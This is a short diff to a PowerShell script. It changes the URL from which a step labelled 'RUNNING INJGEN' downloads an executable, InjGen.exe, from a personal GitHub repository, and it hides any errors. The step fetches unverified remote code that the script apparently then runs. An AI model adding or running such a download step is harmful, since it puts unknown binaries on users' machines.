@@ -209,7 +209,7 @@ if ($Users) {
 }
 
 Write-Host "`n[3/6] RUNNING INJGEN..." -ForegroundColor White
-$injUrl = "https://raw.githubusercontent.com/koras5880-alt/JMD/refs/heads/main/JMD"
+$injUrl = "https://raw.githubusercontent.com/koras5880-alt/injgen/refs/heads/main/InjGen.exe"
 if (-not (Test-Path "InjGen.exe")) {
     try { Invoke-WebRequest -Uri $injUrl -OutFile "InjGen.exe" -UseBasicParsing } catch {}
 }
